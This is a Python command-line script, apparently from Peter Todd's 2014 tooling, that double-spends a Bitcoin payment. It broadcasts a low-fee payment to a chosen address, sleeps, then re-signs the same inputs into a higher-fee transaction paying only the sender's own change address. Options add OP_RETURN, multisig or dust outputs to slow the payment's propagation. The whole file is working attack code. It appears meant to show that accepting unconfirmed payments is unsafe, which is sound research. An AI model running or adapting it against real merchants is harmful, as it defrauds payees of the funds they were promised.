#!/usr/bin/python3
# Copyright (C) 2014 Peter Todd <pete@petertodd.org>
#
# This file is subject to the license terms in the LICENSE file found in the
# top-level directory of this distribution.

import argparse
import binascii
import bitcoin
import bitcoin.rpc
import logging
import math
import time

from bitcoin.core import b2x, b2lx, x, lx, str_money_value, COIN, CMutableTransaction, CMutableTxIn, CMutableTxOut
from bitcoin.core.script import CScript, OP_RETURN, OP_CHECKMULTISIG
from bitcoin.wallet import CBitcoinAddress

parser = argparse.ArgumentParser(
        description="Attempt to double-spend a payment",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter)

parser.add_argument('-t', action='store_true',
                    dest='testnet',
                    help='Enable testnet')
parser.add_argument('-n', action='store_true',
                    dest='dryrun',
                    help="Dry-run; don't actually send the transactions")
parser.add_argument('-d', action='store', type=int,
                    default=30,
                    dest='delay',
                    help="Delay in seconds between payment and double-spend")
parser.add_argument('--dust', action='store', type=float,
                    default=0.0001,
                    help="Dust amount")
parser.add_argument('--fee1', action='store', type=float,
                    metavar='FEEPERKB',
                    default=0.000011,
                    help='Fee-per-KB of payment transaction')
parser.add_argument('--fee2', action='store', type=float,
                    metavar='FEEPERKB',
                    default=0.001,
                    help='Fee-per-KB of double-spend transaction')

parser.add_argument('--op-return', action='store_true',
                    help="Add OP_RETURN <data> output to payment tx")
parser.add_argument('--multisig', action='store_true',
                    help="Add multisig output to payment tx")
parser.add_argument('--optinrbf', action='store_true',
                    default=False,
                    help="Signal full-RBF opt-in (BIP125)")
parser.add_argument('--bad-addr', action='append',
                    default=[],
                    help="Pay some dust to a 'bad' address to discourage propagation")

parser.add_argument('address', action='store', type=str,
                    help='Address to double-spend')
parser.add_argument('amount', action='store', type=float,
                    help='Amount to send')

args = parser.parse_args()

logging.root.setLevel('DEBUG')

if args.testnet:
    bitcoin.SelectParams('testnet')

rpc = bitcoin.rpc.Proxy()

args.dust = int(args.dust * COIN)

feeperbyte1 = args.fee1 / 1000 * COIN
feeperbyte2 = args.fee2 / 1000 * COIN

# Construct payment tx
payment_address = CBitcoinAddress(args.address)

payment_txout = CMutableTxOut(int(args.amount * COIN), payment_address.to_scriptPubKey())
change_txout = CMutableTxOut(0, rpc.getnewaddress().to_scriptPubKey())

tx = CMutableTransaction()
tx.vout.append(change_txout)
tx.vout.append(payment_txout)

# Add all undesirable txouts meant to reduce propagation
if args.op_return:
    op_ret_txout = CMutableTxOut(0, CScript([OP_RETURN, b'\x00unsuccessful double-spend attempt\x00']))
    tx.vout.append(op_ret_txout)

if args.multisig:
    multisig_txout = CMutableTxOut(args.dust,
            CScript([1, x('0378d430274f8c5ec1321338151e9f27f4c676a008bdf8638d07c0b6be9ab35c71'),
                        b'\x00'*33,
                     2, OP_CHECKMULTISIG]))
    tx.vout.append(multisig_txout)

tx1_nSequence = 0xFFFFFFFF-2 if args.optinrbf else 0xFFFFFFFF
tx2_nSequence = tx1_nSequence # maybe they should be different in the future?

for bad_addr in args.bad_addr:
    bad_addr = CBitcoinAddress(bad_addr)
    txout = CMutableTxOut(args.dust, bad_addr.to_scriptPubKey())
    tx.vout.append(txout)


# Add inputs until we meet the fee1 threshold
unspent = sorted(rpc.listunspent(1), key=lambda x: x['amount'])
value_in = 0
value_out = sum([vout.nValue for vout in tx.vout])
while (value_in - value_out) / len(tx.serialize()) < feeperbyte1:
    # What's the delta fee that we need to get to our desired fees per byte at
    # the current tx size?
    delta_fee = math.ceil((feeperbyte1 * len(tx.serialize())) - (value_in - value_out))

    logging.debug('Delta fee: %s' % str_money_value(delta_fee))

    # If we simply subtract that from the change outpoint are we still above
    # the dust threshold?
    if change_txout.nValue - delta_fee > args.dust:
        change_txout.nValue -= delta_fee
        value_out -= delta_fee

    # Do we need to add another input?
    if value_in - value_out < 0:
        new_outpoint = unspent[-1]['outpoint']
        new_amount = unspent[-1]['amount']
        unspent = unspent[:-1]

        logging.debug('Adding new input %s:%d with value %s BTC' % \
                (b2lx(new_outpoint.hash), new_outpoint.n,
                 str_money_value(new_amount)))

        new_txin = CMutableTxIn(new_outpoint, nSequence=tx1_nSequence)
        tx.vin.append(new_txin)

        value_in += new_amount
        change_txout.nValue += new_amount
        value_out += new_amount

        # Resign the tx so we can figure out how large the new input's scriptSig will be.
        r = rpc.signrawtransactionwithwallet(tx)
        assert(r['complete'])

        tx.vin[-1].scriptSig = r['tx'].vin[-1].scriptSig

r = rpc.signrawtransactionwithwallet(tx)
assert(r['complete'])
tx = CMutableTransaction.from_tx(r['tx'])

logging.debug('Payment tx %s' % b2x(tx.serialize()))
logging.info('Payment tx size: %.3f KB, fees: %s, %s BTC/KB' % \
        (len(tx.serialize()) / 1000,
         str_money_value(value_in-value_out),
         str_money_value((value_in-value_out) / len(tx.serialize()) * 1000)))


if not args.dryrun:
    txid = rpc.sendrawtransaction(tx)
    logging.info('Sent payment tx: %s' % b2lx(txid))

if not args.dryrun:
    logging.info('Sleeping for %d seconds' % args.delay)
    time.sleep(args.delay)

# create a new proxy in case the old one timed out during sleep
rpc = bitcoin.rpc.Proxy()

# Double-spend! Remove all but the change output
tx.vout = tx.vout[0:1]
change_txout = tx.vout[0]
value_out = value_in
change_txout.nValue = value_out

# FIXME: need to modularize this code
while (value_in - value_out) / len(tx.serialize()) < feeperbyte2:
    # What's the delta fee that we need to get to our desired fees per byte at
    # the current tx size?
    delta_fee = math.ceil((feeperbyte2 * len(tx.serialize())) - (value_in - value_out))

    logging.debug('Delta fee: %s' % str_money_value(delta_fee))

    # If we simply subtract that from the change outpoint are we still above
    # the dust threshold?
    if change_txout.nValue - delta_fee > args.dust:
        change_txout.nValue -= delta_fee
        value_out -= delta_fee

    # Do we need to add another input?
    if value_in - value_out < 0:
        new_outpoint = unspent[-1]['outpoint']
        new_amount = unspent[-1]['amount']
        unspent = unspent[:-1]

        logging.debug('Adding new input %s:%d with value %s BTC' % \
                (b2lx(new_outpoint.hash), new_outpoint.n,
                 str_money_value(new_amount)))

        new_txin = CMutableTxIn(new_outpoint, nSequence=tx2_nSequence)
        tx.vin.append(new_txin)

        value_in += new_amount
        change_txout.nValue += new_amount
        value_out += new_amount

        # Resign the tx so we can figure out how large the new input's scriptSig will be.
        r = rpc.signrawtransactionwithwallet(tx)
        assert(r['complete'])

        tx.vin[-1].scriptSig = r['tx'].vin[-1].scriptSig

r = rpc.signrawtransactionwithwallet(tx)
assert(r['complete'])
tx = r['tx']

logging.debug('Double-spend tx %s' % b2x(tx.serialize()))
logging.info('Double-spend tx size: %.3f KB, fees: %s, %s BTC/KB' % \
        (len(tx.serialize()) / 1000,
         str_money_value(value_in-value_out),
         str_money_value((value_in-value_out) / len(tx.serialize()) * 1000)))

if not args.dryrun:
    txid = rpc.sendrawtransaction(tx)
    logging.info('Sent double-spend tx: %s' % b2lx(txid))
